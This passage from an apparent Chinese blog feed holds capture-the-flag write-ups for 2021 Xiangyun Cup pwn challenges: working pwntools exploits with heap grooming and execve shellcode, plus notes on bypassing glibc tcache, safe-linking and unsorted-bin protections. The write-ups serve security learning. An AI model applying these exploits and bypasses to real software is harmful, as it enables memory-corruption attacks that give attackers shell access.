lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon  :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;draw and color!&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>p.sendafter(<span class="hljs-string">&quot;game with me?\n&quot;</span>,<span class="hljs-string">&quot;yes&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;number: \n&quot;</span>,<span class="hljs-string">&#x27;111111&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&quot;first: \n&quot;</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>low = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">3</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>debug()<br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;找到爆破字节&quot;</span>) <br>flag_low = low - <span class="hljs-number">0x40</span> + a<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x140</span> + p8(flag_low &amp; <span class="hljs-number">0xff</span>) + p8((flag_low &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>) <span class="hljs-comment">##覆盖环境变量的位置</span><br>edit(-<span class="hljs-number">260</span>,payload)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x500</span>)<br>free(<span class="hljs-number">0</span>)<br>payload = p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x450</span>) + p64(<span class="hljs-number">0x100000020</span>) + p64(<span class="hljs-number">0x0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x01\x01&#x27;</span>,<span class="hljs-number">0x20</span>,payload)<br>    free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>)<br>pwn()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">while True:</span><br><span class="hljs-string">try:</span><br><span class="hljs-string">p = process(&quot;./lemon_pwn&quot;)</span><br><span class="hljs-string">pwn()</span><br><span class="hljs-string">aaa = (&quot;or corruption (!prev):&quot;)</span><br><span class="hljs-string">print aaa</span><br><span class="hljs-string">if &quot;flag&quot; in aaa:</span><br><span class="hljs-string">pause()</span><br><span class="hljs-string">except:</span><br><span class="hljs-string">p.close()</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="JigSaw’sCage"><a href="#JigSaw’sCage" class="headerlink" title="JigSaw’sCage"></a>JigSaw’sCage</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090309078.png" alt="image-20210921090309078"></p><p>常规checksec，64位保护全开</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090356101.png" alt="image-20210921090356101"></p><p>这里的choice是int类型，而输入却是可以输入8字节长度的数据，而v2就是choice相邻的高32位的数据，覆盖v2大于14会得到一块可以执行的堆内存</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090223446.png" alt="image-20210921090223446"></p><p>如上图所示，堆块可执行了</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090636446.png" alt="image-20210921090636446"></p><p>并且存在着功能，是可以执行堆块的，所以可以往堆块上写shellcode</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090735583.png" alt="image-20210921090735583"></p><p>但是，堆块只能生成0x10的堆块，所以直接写入可以getshell的shellcode长度是肯定不够的，至少要二十多个字节长度才行，所以这时候一般可以先看看寄存器有没有什么可以直接利用的脏数据，减少shellcode书写的长度</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095449264.png" alt="image-20210921095449264"></p><p>断点下在test函数要执行堆块内容的那步，查看在这时寄存器存了哪些脏数据</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095610649.png" alt="image-20210921095610649"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100019587.png" alt="image-20210921100019587"></p><p>能发现，R10保存的是一个libc上的地址，所以可以借用这个值去计算free_hook以及system的值，然后再找个寄存器，进行两次执行操作，把system写入free_hook中，然后释放一块写有’/bin/sh’的堆块即可</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100059193.png" alt="image-20210921100059193"></p><p>另外一种shellcode就是直接getshell，需要更多的观察</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101332945.png" alt="image-20210921101332945"></p><p>可以发现，RDX里面的值是堆上的地址，那么我们就可以往堆上写入/bin/sh\x00，然后再计算偏移，传入RDI，再将RDX清零，把59传入al，最后系统调用即可，但是因为长度有限，所以我们一定要注意</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101858450.png" alt="image-20210921101858450"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101917761.png" alt="image-20210921101917761"></p><p>同样getshelll</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./JigSAW&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;iNput:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execve</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Name:\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Make your Choice:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1095216660480&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code1 = asm(&quot;add r10, 0x50068; mov r12, r10;&quot;)</span><br><span class="hljs-string">code2 = asm(&quot;sub r10, 0x1496b0; mov qword ptr [r12], r10&quot;)</span><br><span class="hljs-string">add(0)</span><br><span class="hljs-string">add(1)</span><br><span class="hljs-string">add(2)</span><br><span class="hljs-string">edit(0,code1)</span><br><span class="hljs-string">edit(1,code2)</span><br><span class="hljs-string">edit(2,&#x27;/bin/sh\x00&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">execve(0)</span><br><span class="hljs-string">execve(1)</span><br><span class="hljs-string">free(2)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">add dl,0x20;</span><br><span class="hljs-string">push rsi;</span><br><span class="hljs-string">pop rdi;</span><br><span class="hljs-string">xchg rdi,rdx;</span><br><span class="hljs-string">push rsi;</span><br><span class="hljs-string">pop rax;</span><br><span class="hljs-string">mov al,59;ls</span><br><span class="hljs-string">syscall;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>debug()<br>execve(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都没做出来。下面两个链接是大佬的wp&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/402722060&quot;&gt;https://zhuanlan.zhihu.com/p/4027220</summary>
      
    
    
    
    
    <category term="祥云杯PWN" scheme="http://example.com/tags/%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/"/>
    
  </entry>
  
  <entry>
    <title>libc版本检查机制</title>
    <link href="http://example.com/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/</id>
    <published>2021-08-30T08:28:47.000Z</published>
    <updated>2021-10-13T08:01:22.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇本章是以libc-2.23.so为基础，去对比之后版本的差异问题</p><h2 id="libc-2-23-so"><a href="#libc-2-23-so" class="headerlink" title="libc-2.23.so"></a>libc-2.23.so</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>tcache是在libc-2.27.so引进的一种新机制</p><h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a><strong>tcache_entry</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a><strong>tcache_perthread_struct</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS]; <br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><ul><li><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用单向链表 (<code>tcache_entry</code>) 的方式连接释放的 chunk，这一点上和 fastbin 很像</li><li>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></li><li><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</li><li>tcache_entry用于链接 chunk 结构体，其中的next指针指向下一个大小相同的 chunk<ul><li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后</li></ul></li></ul><p>简单来说：就是类似fastbin一样的东西，每条链上最多可以有 7 个 chunk，free堆块的时候优先放入tcache中，满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找（tcache的范围是 [0x20, 0x410]，超过这个大小的就会放入unsorted bin）</p><p>tcache dup：因为前几个版本的 <code>tcache bin</code>是缺乏校验机制的，即使对<code>tcache bin chunk</code>重复释放，也不会引发任何异常。比<code>fastbin chunk</code>的约束更少，一来不检查size域，二来也不检查是否重复释放</p><p><code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去（前提是先修改0x250大小堆块的count为7），然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存。</p><h3 id="高版本Tcache"><a href="#高版本Tcache" class="headerlink" title="高版本Tcache"></a>高版本Tcache</h3><p>一、在libc-2.29.so及以上的版本往tcache结构体添加了一个<code>key</code>来防止double free，判断条件就是tcache_entry的key指针（被释放堆块的bk指针位置上填入tcache的地址）是否等于<strong>tcache bin</strong>的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>绕过：利用UAF或者溢出等等，修改被释放堆块next指针，哪怕是一个字节都行</p><p>二、在<code> libc-2.32.so</code>版本中新加入了一个 key 会对 tcache next 的内容进行异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="hljs-comment">//不是直接赋值next</span><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>PROTECT_PTR：对 pos 右移了 12 位（去除了末尾的 3 位信息），再异或原来的指针（在这之前 next 储存的堆地址）。</p><p>而这里的 <strong>key 就是储存内容的指针（在代码中叫做 pos）</strong>，在放入的时候让内容与这个 <strong>key</strong> 进行异或再储存，在取出的时候让内容与这个 <strong>key</strong> 进行异或再取出。而得益于这个秘钥就是储存内容的指针，所以无需使用其他空间来放置这个 <strong>key</strong> 的内容，只需要保存异或之后的内容，在解密时只需 <strong>PROTECT_PTR (&amp;ptr, ptr)</strong> 这样操作即可。</p><p>需要注意的是，当 tcache 中只有一个元素的时候，也就是在放入这个元素的过程中，<strong>tcache-&gt;entries[tc_idx] == 0</strong>，在这个时候放入元素的时候会异或 0，也就是在 <strong>e-&gt;next 位置存放</strong>的内容正好就是 <strong>key 的信息</strong>，因为 <strong>key 异或 0 还是秘钥</strong>。而且就算之后加入了其他的元素，这个元素始终还是在链表的尾部，所以内容不会发生变化</p><p>绕过：</p><ul><li>通过 0 异或秘钥还是秘钥的这个特性，当 tcache 链上只有一个指针的时候，我们就可以通过 show 函数来 leak 出秘钥的信息，有了秘钥的信息之后，我们就可以伪造秘钥信息了</li><li>可以通过 largebin 来泄露堆地址，由于 key 是当前指针 &gt;&gt; 12，所以我们可以确保在 4096 字节内这个 key 都是正确的</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="一、泄露堆基址"><a href="#一、泄露堆基址" class="headerlink" title="一、泄露堆基址"></a>一、泄露堆基址</h4><p>构造两个相同 size 的堆块 a 和 b，我们先 free (a) 让他进入到 tcache 中，再 free (b) 也让他进入到 tcache 中。这时候，在堆块 b 的 fd 位置就存在着堆块 a 的地址，我们 leak 出来就能够得到堆地址</p><h2 id="libc-2-29-so"><a href="#libc-2-29-so" class="headerlink" title="libc-2.29.so"></a>libc-2.29.so</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (size &gt; av-&gt;system_mem)) malloc_printerr (<span class="hljs-string">&quot;malloc: invalid size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: mismatching next-&gt;prev_size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) malloc_printerr (<span class="hljs-string">&quot;malloc: unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next))) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next-&gt;prev_inuse (unsorted)&quot;</span>); ...... ...... <span class="hljs-comment">/* remove from unsorted list */</span> <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc: corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck; <br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><ul><li><p>对于<code>unsortbin</code>的解链添加了验证链完整性的检查，让 <code>unsortbin attack</code>失效</p><ul><li><p>绕过：</p><p>1.largebin中的chunk-&gt;fd_nextsize=0;</p><p>2.largebin中的chunk-&gt;bk_nextsize可控制;</p><p>3.unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。</p></li></ul></li></ul><h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><p>高版本一样可用，因为是对unlink的绕过，至少目前我知道的：到libc-2.32是没问题的</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.<code>smallbin</code>中可以控制大小为size块的bk指针</p><p>2.<code>tcache</code>中size块的个数为6</p><p>3.申请堆块是<code>calloc</code></p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ul><li>释放6个0x100的chunk到tcache bin中</li><li>构造两个0x100的small bin（利用Unsorted bin或Large bin切割得到）</li><li>修改后插入的small bin的 bk 指针为目标地址-0x10，且保持fd指针不变</li><li>用calloc分配0x100的chunk</li></ul><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul><li>在目标地址上写入原本small bin上的 bk 指针内容</li></ul><h2 